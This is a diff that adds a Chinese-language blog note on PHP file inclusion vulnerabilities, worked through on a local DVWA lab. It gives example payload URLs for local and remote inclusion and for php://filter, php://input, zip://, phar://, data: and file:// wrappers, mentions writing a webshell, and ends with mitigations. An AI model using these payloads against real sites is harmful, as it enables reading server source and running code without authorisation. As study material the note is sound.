@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>文件包含原理</title>
+      <link href="/2023/02/03/wen-jian-bao-han-yuan-li/"/>
+      <url>/2023/02/03/wen-jian-bao-han-yuan-li/</url>
+      
+        <content type="html"><![CDATA[<h2 id="文件包含原理"><a href="#文件包含原理" class="headerlink" title="文件包含原理"></a>文件包含原理</h2><pre class="line-numbers language-none"><code class="language-none">include() include_once() require() require_once() include()和require()的区别：require()如果在包含过程中出错，就会直接退出，不执行后续语句include()如果在包含过程中出错，只会提出警告，但不影响后续语句的执行index.php?file=php://filter/read=convert.base64-encode/resource=xxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="0x01、什么是文件包含"><a href="#0x01、什么是文件包含" class="headerlink" title="0x01、什么是文件包含?**"></a>0x01、什么是文件包含?**</h3><p>为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。</p><h3 id="0x02、漏洞成因"><a href="#0x02、漏洞成因" class="headerlink" title="0x02、漏洞成因**"></a>0x02、漏洞成因**</h3><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p><h3 id="0x03、php引发文件包含漏洞的四个函数"><a href="#0x03、php引发文件包含漏洞的四个函数" class="headerlink" title="0x03、php引发文件包含漏洞的四个函数**"></a>0x03、php引发文件包含漏洞的四个函数**</h3><ol><li>include() ：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</li><li>inclue_once() ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</li><li>require()：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</li><li>require_once() ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</li></ol><h3 id="0x04、文件包含漏洞分类"><a href="#0x04、文件包含漏洞分类" class="headerlink" title="0x04、文件包含漏洞分类"></a>0x04、文件包含漏洞分类</h3><p><strong>4.1、本地文件包含漏洞</strong><br>顾名思义，指的是能打开并包含本地文件的漏洞。大多数情况下遇到的文件包含漏洞都是本地文件包含漏洞。</p><p><strong>示例4.1：</strong><br>以DVWA的靶场环境为例，靶场地址：<a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file1.php">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file1.php</a></p><p><img src="/images/dvwa.png" alt="dvwa"></p><p>把DVWA Security的等级调到Low，在DVWA\vulnerabilities\fi\source\Low.php中有以下代码</p><p>在DVWA\vulnerabilities\fi\source\index.php中Low.php又被包含在其中，这就构成了文件包含漏洞，而且被包含的文件还是我们可控的。</p><p>在file1同级目录下新建一个名为test.txt的文本文件，内容如下：</p><p>访问<a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=test.txt">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=test.txt</a></p><p><img src="/images/testphp.png" alt="test"></p><p>文件包含可以包含任意文件，如图片，文本文件，压缩包等等，如果文件中有服务器能识别的脚本语言，就按照当前脚本语言执行，否则就直接显示出源代码。</p><p><strong>4.2、远程文件包含漏洞</strong></p><p>是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在，危害性会很大。</p><p>但远程文件包含漏洞的利用条件较为苛刻，需要php.ini中配置<br>allow_url_fopen=On<br>allow_url_include=On</p><p><strong>示例4.2：</strong><br>先打开目标服务器的php.ini文件进行以下相关设置，然后重启服务器</p><p><img src="/images/phpini.png" alt="phpini"></p><p>之后在本地新建文件test2.txt，文件内容为：<br>目标服务器ip：192.168.1.114<br>本机ip：192.168.1.106<br>访问<a href="http://192.168.1.114/DVWA/vulnerabilities/fi/?page=http://192.168.1.106/test2.txt">http://192.168.1.114/DVWA/vulnerabilities/fi/?page=http://192.168.1.106/test2.txt</a></p><p><img src="/images/test2.png" alt="test2"></p><h3 id="0x05、文件包含漏洞之伪协议"><a href="#0x05、文件包含漏洞之伪协议" class="headerlink" title="0x05、文件包含漏洞之伪协议**"></a>0x05、文件包含漏洞之伪协议**</h3><p><strong>5.1、php://filter</strong><br>利用条件：<br>只是读取，所以只需要开启allow_url_fopen，对allow_url_include不做要求<br>用法：<br>通过指定末尾文件，可以读取经base64加密后的文件源码，虽然不能直接获取shell等，但能够读取敏感文件，危害还是是挺大的。</p><p><strong>示例5.1：</strong><br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=test.txt">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=test.txt</a></p><p><img src="/images/base64encode.png" alt="base64"></p><p><strong>5.2、php://input</strong><br>可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行<br>利用条件：<br>需要开启allow_url_include=on，对allow_url_fopen不做要求<br>用法：?file=php://input 数据利用POST传过去。</p><p><strong>示例5.2：</strong></p><p><img src="/images/52.png"></p><p>也可以写入木马</p><p><img src="/images/muma.png" alt="muma"></p><p>还可以命令执行</p><p><img src="/images/zhixing.png"></p><p><strong>5.3、zip://伪协议</strong><br>zip://可以访问压缩文件中的文件<br>条件： 使用zip协议，需要将#编码为%23，所以需要PHP 的版本&gt; =5.3.0，要是因为版本的问题无法将#编码成%23，可以手动把#改成%23。<br>用法：?file=zip://[压缩文件路径]#[压缩文件内的子文件名]</p><p><strong>示例5.3：</strong><br>在本地新建一个文件test.php，并且压缩成test.zip压缩包</p><p><img src="/images/testzip.png"></p><p>要是把压缩包的后缀改为其他任意格式的文件也可以正常使用。</p><p><strong>5.4、phar://伪协议</strong><br>与zip://协议类似，但用法不同，zip://伪协议中是用#把压缩文件路径和压缩文件的子文件名隔开，而phar://伪协议中是用/把压缩文件路径和压缩文件的子文件名隔开，即?file=phar://[压缩文件路径]/[压缩文件内的子文件名]</p><p><strong>示例5.4：</strong></p><p><img src="/images/test.png"></p><p><strong>5.5、data:text/plain</strong><br>和php伪协议的input类似，也可以执行任意代码，但利用条件和用法不同<br>条件：allow_url_fopen参数与allow_url_include都需开启<br>用法1：?file=data:text/plain,<br>用法2：?file=data:text/plain;base64,编码后的php代码</p><p><strong>示例5.5：</strong></p><p><img src="/images/phpinfo.png"></p><p><img src="/images/data.png"></p><p>注：经base64编码后的加号和等号要手动的url编码，以免浏览器识别不了</p><p><strong>5.6、file://伪协议</strong><br>file:// 用于访问本地文件系统，且不受allow_url_fopen与allow_url_include的影响。<br>用法：?file=file://文件绝对路径</p><p><strong>示例5.6</strong></p><p><img src="/images/56.png"></p><h2 id="0x06、修复方案"><a href="#0x06、修复方案" class="headerlink" title="0x06、修复方案"></a>0x06、修复方案</h2><p>1、PHP 中使用 open_basedir 配置限制访问在指定的区域<br>2、过滤.（点）/（反斜杠）\（反斜杠）等特殊字符<br>3、尽量关闭allow_url_include配置</p><h2 id="0x07、总结"><a href="#0x07、总结" class="headerlink" title="0x07、总结"></a>0x07、总结</h2><p>关于文件包含的内容，目前小白也就只能总结出这些了，总之收获不菲，感觉很有用。</p><p><img src="/images/wenjianbaohan.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 学习笔记总结 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞原理分析 </tag>
+            
+            <tag> 文件包含漏洞学习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>xss学习笔记</title>
       <link href="/2023/02/03/xss-xue-xi-bi-ji/"/>
       <url>/2023/02/03/xss-xue-xi-bi-ji/</url>
